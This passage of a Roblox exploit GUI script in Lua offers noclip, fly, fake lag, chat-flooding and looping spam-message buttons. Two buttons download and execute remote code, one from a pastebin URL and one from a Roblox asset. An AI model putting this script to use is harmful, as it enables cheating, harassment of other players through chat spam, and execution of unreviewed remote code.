		local destroychat = Instance.new("TextButton")
		local sit = Instance.new("TextButton")
		local fly = Instance.new("TextButton")
		local tp = Instance.new("TextButton")
		local message = Instance.new("TextButton")
		local floatingpad = Instance.new("TextButton")
		local r6 = Instance.new("TextButton")
		local c00lgui = Instance.new("TextButton")
		local rejoin = Instance.new("TextButton")
	
		--Properties:
	
		ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
		ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	
		Frame.Parent = ScreenGui
		Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Frame.Position = UDim2.new(-0.0196145065, 168, 0.642360091, -215)
		Frame.Size = UDim2.new(0, 417, 0, 280)
	
		Name.Name = "Name"
		Name.Parent = Frame
		Name.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		Name.Size = UDim2.new(0, 417, 0, 25)
		Name.Font = Enum.Font.GothamBold
		Name.Text = "1x1x1x1 Gui FE"
		Name.TextColor3 = Color3.fromRGB(0, 0, 0)
		Name.TextScaled = true
		Name.TextSize = 14.000
		Name.TextWrapped = true
	
		Credits.Name = "Credits"
		Credits.Parent = Frame
		Credits.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		Credits.Position = UDim2.new(3.65918211e-08, 0, 0.911999941, 0)
		Credits.Size = UDim2.new(0, 416, 0, 22)
		Credits.Font = Enum.Font.GothamBold
		Credits.Text = "By FishNoobAhh"
		Credits.TextColor3 = Color3.fromRGB(0, 0, 0)
		Credits.TextScaled = true
		Credits.TextSize = 14.000
		Credits.TextWrapped = true
	
		ball.Name = "ball"
		ball.Parent = Frame
		ball.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		ball.Position = UDim2.new(0.0511240065, 0, 0.154811308, 0)
		ball.Size = UDim2.new(0, 79, 0, 31)
		ball.Font = Enum.Font.GothamBold
		ball.Text = "become ball"
		ball.TextColor3 = Color3.fromRGB(0, 0, 0)
		ball.TextScaled = true
		ball.TextSize = 14.000
		ball.TextWrapped = true
	
		noclip.Name = "noclip"
		noclip.Parent = Frame
		noclip.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		noclip.Position = UDim2.new(0.0511240065, 0, 0.308153421, 0)
		noclip.Size = UDim2.new(0, 79, 0, 31)
		noclip.Font = Enum.Font.GothamBold
		noclip.Text = "noclip"
		noclip.TextColor3 = Color3.fromRGB(0, 0, 0)
		noclip.TextScaled = true
		noclip.TextSize = 14.000
		noclip.TextWrapped = true
	
		fakelag.Name = "fakelag"
		fakelag.Parent = Frame
		fakelag.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		fakelag.Position = UDim2.new(0.0511240065, 0, 0.454681605, 0)
		fakelag.Size = UDim2.new(0, 79, 0, 34)
		fakelag.Font = Enum.Font.GothamBold
		fakelag.Text = "fe fake lag"
		fakelag.TextColor3 = Color3.fromRGB(0, 0, 0)
		fakelag.TextScaled = true
		fakelag.TextSize = 14.000
		fakelag.TextWrapped = true
		fakelag.MouseButton1Down:Connect(function()
			while true do
				game.Players.LocalPlayer.Character.Torso.Anchored = true
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
				wait(0.1)
				game.Players.LocalPlayer.Character.Torso.Anchored = false
				game.Players.LocalPlayer.Character.Humanoid.Sit = true
				wait(0.1)
			end
		end)
		plane.Name = "plane"
		plane.Parent = Frame
		plane.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		plane.Position = UDim2.new(0.386630774, 0, 0.154811308, 0)
		plane.Size = UDim2.new(0, 83, 0, 31)
		plane.Font = Enum.Font.GothamBold
		plane.Text = "become a plane"
		plane.TextColor3 = Color3.fromRGB(0, 0, 0)
		plane.TextScaled = true
		plane.TextSize = 14.000
		plane.TextWrapped = true
	
		destroychat.Name = "destroy chat"
		destroychat.Parent = Frame
		destroychat.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		destroychat.Position = UDim2.new(0.391426951, 0, 0.308153421, 0)
		destroychat.Size = UDim2.new(0, 83, 0, 31)
		destroychat.Font = Enum.Font.GothamBold
		destroychat.Text = "destroy chat fe (op warning)"
		destroychat.TextColor3 = Color3.fromRGB(0, 0, 0)
		destroychat.TextScaled = true
		destroychat.TextSize = 14.000
		destroychat.TextWrapped = true
		destroychat.MouseButton1Down:Connect(function()
			for i = 1, 4 do
				local args = {
					[1] = "\194\160\194\160",
					[2] = "All"
				}
	
				game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
			end
		end)
		sit.Name = "sit"
		sit.Parent = Frame
		sit.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		sit.Position = UDim2.new(0.391426951, 0, 0.457778603, 0)
		sit.Size = UDim2.new(0, 83, 0, 34)
		sit.Font = Enum.Font.GothamBold
		sit.Text = "sit"
		sit.TextColor3 = Color3.fromRGB(0, 0, 0)
		sit.TextScaled = true
		sit.TextSize = 14.000
		sit.TextWrapped = true
		sit.MouseButton1Down:Connect(function()
			local human = kevyn.Parent:findFirstChild("Humanoid")
			if (human ~= nil)then
				human.Sit=true
			end
		end)
		fly.Name = "fly"
		fly.Parent = Frame
		fly.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		fly.Position = UDim2.new(0.723578513, 0, 0.154811308, 0)
		fly.Size = UDim2.new(0, 89, 0, 31)
		fly.Font = Enum.Font.GothamBold
		fly.Text = "fly"
		fly.TextColor3 = Color3.fromRGB(0, 0, 0)
		fly.TextScaled = true
		fly.TextSize = 14.000
		fly.TextWrapped = true
	
		tp.Name = "tp"
		tp.Parent = Frame
		tp.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		tp.Position = UDim2.new(0.723578513, 0, 0.308153421, 0)
		tp.Size = UDim2.new(0, 89, 0, 31)
		tp.Font = Enum.Font.GothamBold
		tp.Text = "click to tp"
		tp.TextColor3 = Color3.fromRGB(0, 0, 0)
		tp.TextScaled = true
		tp.TextSize = 14.000
		tp.TextWrapped = true
	
		message.Name = "message"
		message.Parent = Frame
		message.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		message.Position = UDim2.new(0.723578513, 0, 0.457778603, 0)
		message.Size = UDim2.new(0, 89, 0, 34)
		message.Font = Enum.Font.GothamBold
		message.Text = "messages"
		message.TextColor3 = Color3.fromRGB(0, 0, 0)
		message.TextScaled = true
		message.TextSize = 14.000
		message.TextWrapped = true
		message.MouseButton1Down:Connect(function()
			while true do
				wait(2)
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("1x1x1x1: MUHAWHAWHAW!! I HAVE RETURNED FOR MY REVENGE!!", "ALL")
				wait(3)
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("1x1x1x1: NOW YOU WILL ALL PARISH IN MY FIRE OF DOOM!!", "ALL")
				wait(3)
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("1x1x1x1: I WILL DESTR0Y YOU ALL! YOU ARE HATERS!", "ALL")
				wait(3)
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("1x1x1x1: YOU WILL NOT LIVE THROUGH MY DEADLY ATTACKS!!", "ALL")
				wait(3)
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("1x1x1x1: I MIGHT AS WELL CLONE YOU INTO BOTS!!", "ALL")
				wait(3)
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("1x1x1x1: AND THEN THOSE BOTS WILL DESTROY ROBLOX! HAHAHAHAHA!!", "ALL")
				wait(3)
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("1x1x1x1: YOU CAN'T STOP ME! THERES NOTHING YOU CAN DO!!", "ALL")
				wait(2)
			end
		end)
	
		floatingpad.Name = "floatingpad"
		floatingpad.Parent = Frame
		floatingpad.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		floatingpad.Position = UDim2.new(0.0511240065, 0, 0.620496035, 0)
		floatingpad.Size = UDim2.new(0, 79, 0, 34)
		floatingpad.Font = Enum.Font.GothamBold
		floatingpad.Text = "floating pad (requires r6)"
		floatingpad.TextColor3 = Color3.fromRGB(0, 0, 0)
		floatingpad.TextScaled = true
		floatingpad.TextSize = 14.000
		floatingpad.TextWrapped = true
	
		r6.Name = "r6"
		r6.Parent = Frame
		r6.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		r6.Position = UDim2.new(0.393903613, 0, 0.620496035, 0)
		r6.Size = UDim2.new(0, 79, 0, 34)
		r6.Font = Enum.Font.GothamBold
		r6.Text = "r15 to r6"
		r6.TextColor3 = Color3.fromRGB(0, 0, 0)
		r6.TextScaled = true
		r6.TextSize = 14.000
		r6.TextWrapped = true
		r6.MouseButton1Down:Connect(function()
			loadstring(game:HttpGet(('https://pastebin.com/raw/jHGVauVX'),true))()
		end)
		c00lgui.Name = "c00lgui"
		c00lgui.Parent = Frame
		c00lgui.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		c00lgui.Position = UDim2.new(0.723578513, 0, 0.620496035, 0)
		c00lgui.Size = UDim2.new(0, 88, 0, 34)
		c00lgui.Font = Enum.Font.GothamBold
		c00lgui.Text = "fe c00lgui"
		c00lgui.TextColor3 = Color3.fromRGB(0, 0, 0)
		c00lgui.TextScaled = true
		c00lgui.TextSize = 14.000
		c00lgui.TextWrapped = true
		c00lgui.MouseButton1Down:Connect(function()
			loadstring(game:GetObjects("rbxassetid://9827584846")[1].Source)()
		end)
		rejoin.Name = "rejoin"
		rejoin.Parent = Frame
		rejoin.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		rejoin.Position = UDim2.new(0.0511240065, 0, 0.76692462, 0)
		rejoin.Size = UDim2.new(0, 79, 0, 34)
		rejoin.Font = Enum.Font.GothamBold
		rejoin.Text = "rejoin"
		rejoin.TextColor3 = Color3.fromRGB(0, 0, 0)
		rejoin.TextScaled = true
		rejoin.TextSize = 14.000
		rejoin.TextWrapped = true
		rejoin.MouseButton1Down:Connect(function()
			local player = game.Players.LocalPlayer
			local gamePlaceId = game.PlaceId
			local teleportService = game:GetService("TeleportService")
			teleportService:Teleport(gamePlaceId, player)
		end)
	
		-- Scripts:
	
		local function WVDQ_fake_script() -- ball.LocalScript 
			local script = Instance.new('LocalScript', ball)
	
			script.Parent.MouseButton1Click:Connect(function()
				local UserInputService = game:GetService("UserInputService")
				local RunService = game:GetService("RunService")
				local Camera = workspace.CurrentCamera
	
				local SPEED_MULTIPLIER = 30
				local JUMP_POWER = 60
				local JUMP_GAP = 0.3
	
				local character = game.Players.LocalPlayer.Character
	
				for i,v in ipairs(character:GetDescendants()) do
					if v:IsA("BasePart") then
						v.CanCollide = false
					end
				end
	
				local ball = character.HumanoidRootPart
				ball.Shape = Enum.PartType.Ball
				ball.Size = Vector3.new(5,5,5)
				local humanoid = character:WaitForChild("Humanoid")
				local params = RaycastParams.new()
				params.FilterType = Enum.RaycastFilterType.Blacklist
				params.FilterDescendantsInstances = {character}
	
				local tc = RunService.RenderStepped:Connect(function(delta)
					ball.CanCollide = true
					humanoid.PlatformStand = true
					if UserInputService:GetFocusedTextBox() then return end
					if UserInputService:IsKeyDown("W") then
						ball.RotVelocity -= Camera.CFrame.RightVector * delta * SPEED_MULTIPLIER
					end
					if UserInputService:IsKeyDown("A") then
						ball.RotVelocity -= Camera.CFrame.LookVector * delta * SPEED_MULTIPLIER
					end
					if UserInputService:IsKeyDown("S") then
						ball.RotVelocity += Camera.CFrame.RightVector * delta * SPEED_MULTIPLIER
					end
					if UserInputService:IsKeyDown("D") then
						ball.RotVelocity += Camera.CFrame.LookVector * delta * SPEED_MULTIPLIER
					end
					--ball.RotVelocity = ball.RotVelocity - Vector3.new(0,ball.RotVelocity.Y/50,0)
				end)
	
				UserInputService.JumpRequest:Connect(function()
					local result = workspace:Raycast(
						ball.Position,
						Vector3.new(
							0,
							-((ball.Size.Y/2)+JUMP_GAP),
							0
						),
						params
					)
					if result then
						ball.Velocity = ball.Velocity + Vector3.new(0,JUMP_POWER,0)
					end
				end)
	
				Camera.CameraSubject = ball
				humanoid.Died:Connect(function() tc:Disconnect() end)
			end)
		end
		coroutine.wrap(WVDQ_fake_script)()
		local function UUBW_fake_script() -- noclip.LocalScript 
			local script = Instance.new('LocalScript', noclip)
	
			local noClipEnabled = false
	
	
			--Toggle noclipButton
	
			script.parent.MouseButton1Click:Connect(function()
				noClipEnabled = not noClipEnabled
				script.Parent.Text = noClipEnabled and "No-Clip: ON" or "No-Clip: OFF"
				if noClipEnabled then
					-- Enable Button
					game:GetService("RunService").Stepped:Connect(function()
						if noClipEnabled then
							for _, part in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
								if part:IsA("BasePart") and part.CanCollide then
									part.CanCollide = false
								end
							end
						end
					end)
				else
					--Disable noclipButton
					for _, part in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
						if part:IsA("BasePart") then
							part.CanCollide = true
						end
					end
				end
			end)
		end
		coroutine.wrap(UUBW_fake_script)()
		local function JLHA_fake_script() -- plane.LocalScript 
			local script = Instance.new('LocalScript', plane)
	
			function click()
				repeat wait() until game:IsLoaded() and game:service("Players").LocalPlayer.Character ~= nil;
				wait(0.4) 
				for i, v in pairs(game:service("Players").LocalPlayer.Character:children()) do 
					if v ~= script then 
						v:Destroy() 
					end 
				end 
	
				local player = game:service("Players").LocalPlayer
				local mouse = player:GetMouse() 
				local cam = workspace.CurrentCamera 
				local char = player.Character 
				local Torsoz = char:findFirstChild("Torso") 
				local NV = Vector3.new() 
				local Main 
				local W,S = false,false 
				local DoublePress = {nil,0} 
				script.Parent = char 
	
				local TrailParts = {} 
				local Acceleration = 0.08 
				local Speed = 0 
				local MinSpeed = 0 
				local MaxSpeed = 3.2 
				local DesiredDirection = cam.CoordinateFrame.lookVector 
				local Direction = DesiredDirection 
				local Roll = 0 
				local AllowTrails = true 
	
				script.Name = "AdvFlight" 
	
				local P = Instance.new("Part") 
				P.Anchored = true 
				P.CanCollide = false 
				P.Name = "Part" 
				P.formFactor = "Custom" 
				P.Size = Vector3.new(0.2,0.2,0.2) 
				P.Locked = true 
				P.TopSurface = 10 
				P.BottomSurface = 10 
				P.FrontSurface = 10 
				P.BackSurface = 10 
				P.LeftSurface = 10 
				P.RightSurface = 10 
				P.Material = "Pebble" 
				P.BrickColor = BrickColor.new("White") 
	
				local shipp 
				local shadow 
				local campart 
	
				function RAY(pos, dir, startpos, endpos, distleft, collidedlist) 
					collidedlist = collidedlist or {char} 
					startpos = startpos or pos 
					distleft = distleft or dir.unit * dir.magnitude 
					endpos = endpos or pos + distleft 
					local ray = Ray.new(pos, distleft) 
					local hitz,enz = workspace:FindPartOnRayWithIgnoreList(ray, collidedlist) 
					if hitz ~= nil then 
						if hitz.CanCollide == false then 
							table.insert(collidedlist, hitz) 
							local newpos = enz 
							local newdistleft = distleft - (dir.unit * (pos - newpos).magnitude) 
							if newdistleft ~= NV then 
								return RAY(newpos-(dir*0.01), dir, startpos, endpos, newdistleft+(dir*0.01), collidedlist) 
							end 
						end 
					end 
					return hitz, enz, ray 
				end 
	
				function FindSurface(part, position) 
					local obj = part.CFrame:pointToObjectSpace(position) 
					local siz = part.Size/2 
					for i,v in pairs(Enum.NormalId:GetEnumItems()) do 
						local vec = Vector3.FromNormalId(v) 
						local wvec = part.CFrame:vectorToWorldSpace(vec) 
						local vz = (obj)/(siz*vec) 
						if (math.abs(vz.X-1) < 0.01 or math.abs(vz.Y-1) < 0.01 or math.abs(vz.Z-1) < 0.01) then
							return wvec,vec 
						end 
					end 
					if part.className == "WedgePart" then 
						return part.CFrame:vectorToWorldSpace(Vector3.new(0,0.707,-0.707)), Vector3.new(0,0.707,-0.707) 
					end 
				end 
	
				function HSV(H,S,V) 
					H = H % 360 
					local C = V * S 
					local H2 = H/60 
					local X = C * (1 - math.abs((H2 %2) -1)) 
					local color = Color3.new(0,0,0) 
					if H2 <= 0 then 
						color = Color3.new(C,0,0) 
					elseif 0 <= H2 and H2 <= 1 then 
						color = Color3.new(C,X,0) 
					elseif 1 <= H2 and H2 <= 2 then 
						color = Color3.new(X,C,0) 
					elseif 2 <= H2 and H2 <= 3 then 
						color = Color3.new(0,C,X) 
					elseif 3 <= H2 and H2 <= 4 then 
						color = Color3.new(0,X,C) 
					elseif 4 <= H2 and H2 <= 5 then 
						color = Color3.new(X,0,C) 
					elseif 5 <= H2 and H2 <= 6 then 
						color = Color3.new(C,0,X) 
					end 
					local m = V - C
					return Color3.new(color.r + m, color.g + m, color.b + m) 
				end 
	
				function Build(shiptype) 
					AllowTrails = true 
					for i, v in pairs(char:children()) do 
						if v.className == "Model" and v.Name == "Ship" then 
							v:remove() 
						end 
					end 
					for i, v in pairs(TrailParts) do 
						for _,V in pairs(v[3]) do 
							V:Destroy() 
						end 
					end 
					local mdl = Instance.new("Model", char) 
					mdl.Name = "Ship" 
	
					------------------------ Speeder Ship Type -----------------------------
					if shiptype == "Speeder" then 
	
						shipp = P:Clone() 
						shipp.Parent = mdl 
						shipp.Size = Vector3.new(1,1,2.2) 
						local shipwing1 = P:Clone() 
						shipwing1.Parent = mdl 
						shipwing1.Size = Vector3.new(0.6,1.2,2) 
						local mesh = Instance.new("SpecialMesh", shipwing1) 
						mesh.MeshType = "Wedge" 
						local shipwing2 = shipwing1:Clone() 
						shipwing2.Parent = mdl 
						campart = P:Clone() 
						campart.Transparency = 1 
						local shipwing21 = P:Clone() 
						shipwing21.Parent = mdl 
						shipwing21.Size = Vector3.new(0.32,1.1,2.6) 
						local mesh = Instance.new("SpecialMesh", shipwing21) 
						mesh.MeshType = "Wedge" 
						local shipwing22 = shipwing21:Clone() 
						shipwing22.Parent = mdl 
						campart = P:Clone() 
						campart.Transparency = 1 
	
						local shipwi = P:Clone() 
						shipwi.Parent = mdl 
						shipwi.Size = Vector3.new(1,1,1.2) 
						local mesh = Instance.new("SpecialMesh", shipwi) 
						mesh.MeshType = "Wedge" 
						local shipwi2 = P:Clone() 
						shipwi2.Parent = mdl 
						shipwi2.Size = Vector3.new(0.7,0.7,0.84) 
						shipwi2.Material = "SmoothPlastic" 
						shipwi2.BrickColor = BrickColor.new("Pastel blue") 
						shipwi2.Reflectance = 0.6 
						local mesh = Instance.new("SpecialMesh", shipwi2) 
						mesh.MeshType = "Wedge" 
	
						shadow = P:Clone() 
						shadow.Parent = mdl 
						shadow.Name = "Shadow" 
						shadow.Material = "SmoothPlastic" 
						shadow.BrickColor = BrickColor.new("Really black") 
						local mesh = Instance.new("SpecialMesh",shadow) 
						mesh.MeshType = "Sphere" 
	
						TrailParts = {} 
						table.insert(TrailParts,{shipp,1,{},cam.CoordinateFrame.p,CFrame.new(0,0,1),0.5,18}) 
						table.insert(TrailParts,{shipwing1,1,{},cam.CoordinateFrame.p,CFrame.new(0,0.45,1),0.3,15}) 
						table.insert(TrailParts,{shipwing2,1,{},cam.CoordinateFrame.p,CFrame.new(0,0.45,1),0.3,15}) 
						for _, V in pairs(TrailParts) do 
							for i = 1, V[7] do 
								local p = P:Clone() 
								local mesh = Instance.new("SpecialMesh", p) 
								mesh.MeshId = "http://www.roblox.com/asset/?id=9856898" 
								mesh.TextureId = "http://www.roblox.com/asset/?id=48358980" 
								p.BrickColor = BrickColor.new("Dark stone grey") 
								table.insert(V[3],p) 
							end 
						end 
	
						function ReposParts() 
							shipwing1.CFrame = shipp.CFrame * CFrame.new(-1.1,-0.195,-0.14) * CFrame.Angles(0,0,math.pi/2) 
							shipwing2.CFrame = shipp.CFrame * CFrame.new(1.1,-0.195,-0.14) * CFrame.Angles(0,0,-math.pi/2) 
							shipwing21.CFrame = shipp.CFrame * CFrame.new(-1.05,-0.34,-0.45) * CFrame.Angles(0,0,math.pi/2) 
							shipwing22.CFrame = shipp.CFrame * CFrame.new(1.05,-0.34,-0.45) * CFrame.Angles(0,0,-math.pi/2) 
							shipwi.CFrame = shipp.CFrame * CFrame.new(0,0,-1.7) 
							shipwi2.CFrame = shipwi.CFrame * CFrame.new(0,0.015,-0.015) 
							campart.CFrame = shipp.CFrame + Vector3.new(0,1.5,0) 
						end 
						cam.CameraSubject = campart 
						cam.CameraType = "Track" 
	
						shipp.CFrame = CFrame.new(NV,Direction) + cam.CoordinateFrame.p 
						ReposParts() 
	
					end 
	
					AllowTrails = true 
				end 
				Build("Speeder") 
	
				function B1D() 
					Build("Speeder") 
				end 
	
				function RollThatSht(direc) 
					if Roll == 0 then 
						for i = 1, 50 do 
							Roll = (-360 + math.cos(math.pi/50*i) * 360) * direc 
							wait(0.02) 
						end 
						Roll = 0 
					end 
				end 
	
				function KD(key) 
					if key == "w" then 
						W = true 
					elseif key == "s" then 
						S = true 
					end 
	
					local rollpls = 0 
					if key == DoublePress[1] and tick() - DoublePress[2] < 0.32 then 
						DoublePress = {nil,0} 
						if key == "a" then 
							rollpls = -1 
						elseif key == "d" then 
							rollpls = 1 
						end 
					end 
	
					DoublePress = {key,tick()} 
					if rollpls ~= 0 then 
						RollThatSht(rollpls) 
					end 
				end 
	
				function KU(key) 
					if key == "w" then 
						W = false 
					elseif key == "s" then 
						S = false 
					end 
				end 
	
				function Equip() 
				end 
	
				function Unequip() 
				end 
	
				mouse.Icon = "rbxasset://textures\\GunCursor.png" 
				mouse.Button1Down:connect(B1D) 
				mouse.KeyDown:connect(KD) 
				mouse.KeyUp:connect(KU) 
	
	
	
				local count = 0 
				local hue = 0 
				--game:GetService("RunService").Stepped:connect(function() 
				while wait(0.02) do 
	
					------ Speed --------
					local valu = (0.002*MaxSpeed) + ((Speed/MaxSpeed)*Acceleration)
					if W == true then 
						Speed = Speed + valu 
					elseif S == true then 
						Speed = Speed - valu 
					end 
					if Speed > MaxSpeed then 
						Speed = MaxSpeed 
					elseif Speed < MinSpeed then 
						Speed = MinSpeed 
					end 
	
					------ left/right tilt ---------
					local target = 180 + math.floor(math.deg(math.atan2(DesiredDirection.x,DesiredDirection.z))) 
					local current = 180 + math.floor(math.deg(math.atan2(Direction.x,Direction.z))) 
					local swing = 0 
					if math.abs(math.abs(current-target) - 360) > math.abs(target-current) then 
						swing = target-current 
					else 
						swing = (current > target and -(math.abs(current-target) - 360)) or (current < target and math.abs(current-target) - 360) 
					end 
	
					DesiredDirection = cam.CoordinateFrame.lookVector 
					------ direction smoothening ------ 
					local dir = DesiredDirection.unit 
					if Direction ~= dir then 
						if (Direction - dir).magnitude < 0.01 then 
							Direction = dir 
						else 
							local dist = ((dir - Direction).unit * (dir - Direction).magnitude) /10 
							Direction = (Direction + dist).unit 
						end 
					end 
	
					shipp.CFrame = (CFrame.new(NV,Direction) + shipp.Position + (Direction.unit * Speed)) * CFrame.Angles(0,0,math.rad(Roll) + math.rad(swing/2)) 
					ReposParts() 
	
					------ shadow ------
					local ghitz, genz = RAY(shipp.Position,Vector3.new(0,-26,0)) 
					local angles = CFrame.new() 
					if ghitz ~= nil and ghitz.className ~= "Terrain" and ((ghitz.className == "Part" and ghitz.Shape == Enum.PartType.Block) or (ghitz.className ~= "Part" and ghitz:IsA("BasePart"))) then 
						local wvec,vec = FindSurface(ghitz,genz) 
						angles = CFrame.new(NV,wvec) * CFrame.Angles(-math.pi/2,0,0) 
					elseif ghitz ~= nil and (ghitz.className == "Part" and ghitz.Shape == Enum.PartType.Ball) then 
						angles = (CFrame.new(ghitz.Position, genz) - ghitz.Position) * CFrame.Angles(-math.pi/2,0,0) 
					end 
					shadow.CFrame = CFrame.new(genz) * angles 
					shadow.Transparency = 0.5 + (((shipp.Position - genz).magnitude /26)*0.5)
					shadow.Mesh.Scale = (Vector3.new(4.4,0.25,4.4) * 5) * (1-(shipp.Position - genz).magnitude /26)
	
					------- Trails ----------------------- 
					if AllowTrails == true then 
						count = (count+1)%1 
						hue = (hue+1) % 360
						local rgb = HSV(hue,0.65,0.85) 
						for _,v in pairs(TrailParts) do 
							local to = (v[1].CFrame * v[5]).p
							if Speed > MinSpeed + 0.2 then 
								v[2] = (v[2]%#v[3]) + 1 
								v[3][v[2]].CFrame = CFrame.new((v[4] + to)/2,to) * CFrame.Angles(math.pi/2,math.rad(Roll) + math.rad(swing/2),0) 
								v[3][v[2]].Mesh.Scale = Vector3.new(v[6],(v[4] - to).magnitude*2,v[6]) 
								v[3][v[2]].Mesh.VertexColor = Vector3.new(rgb.r,rgb.g,rgb.b) 
								v[3][v[2]].Transparency = 0.15 
								v[3][v[2]].Parent = game.Players.LocalPlayer.Character
							else 
								v[2] = (v[2]%#v[3]) + 1 
								v[3][v[2]].Parent = nil 
							end 
	
							v[4] = to 
						end 
					end 
	
				end 
				--end) 
	
				-- 138098590 -- plane destroyed sound 
				-- 133082569 -- propeller 2 
				-- 135645246 -- propeller 1 
		--[[ Possible Game names 
		Aeroscape
		Airbound
		Aerialtude
		]]
			end
	
			script.Parent.MouseButton1Down:connect(click)
		end
		coroutine.wrap(JLHA_fake_script)()
		local function SSWSNG_fake_script() -- fly.LocalScript 
			local script = Instance.new('LocalScript', fly)
	
			speeds = 1
	
			local speaker = game:GetService("Players").LocalPlayer
	
			local chr = game.Players.LocalPlayer.Character
			local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
	
			nowe = false
	
	
			script.parent.MouseButton1Down:connect(function()
	
				if nowe == true then
					nowe = false
	
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,true)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,true)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,true)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,true)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,true)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,true)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,true)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,true)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,true)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,true)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,true)
					speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
				else 
					nowe = true
	
	
	
					for i = 1, speeds do
						spawn(function()
	
							local hb = game:GetService("RunService").Heartbeat	
	
	
							tpwalking = true
							local chr = game.Players.LocalPlayer.Character
							local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
							while tpwalking and hb:Wait() and chr and hum and hum.Parent do
								if hum.MoveDirection.Magnitude > 0 then
									chr:TranslateBy(hum.MoveDirection)
								end
							end
	
						end)
					end
					game.Players.LocalPlayer.Character.Animate.Disabled = true
					local Char = game.Players.LocalPlayer.Character
					local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
	
					for i,v in next, Hum:GetPlayingAnimationTracks() do
						v:AdjustSpeed(0)
					end
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false)
					speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false)
					speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
				end
	
	
	
	
				if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then
	
	
	
					local plr = game.Players.LocalPlayer
					local torso = plr.Character.Torso
					local flying = true
					local deb = true
					local ctrl = {f = 0, b = 0, l = 0, r = 0}
					local lastctrl = {f = 0, b = 0, l = 0, r = 0}
					local maxspeed = 50
					local speed = 0
	
	
					local bg = Instance.new("BodyGyro", torso)
					bg.P = 9e4
					bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
					bg.cframe = torso.CFrame
					local bv = Instance.new("BodyVelocity", torso)
					bv.velocity = Vector3.new(0,0.1,0)
					bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
					if nowe == true then
						plr.Character.Humanoid.PlatformStand = true
					end
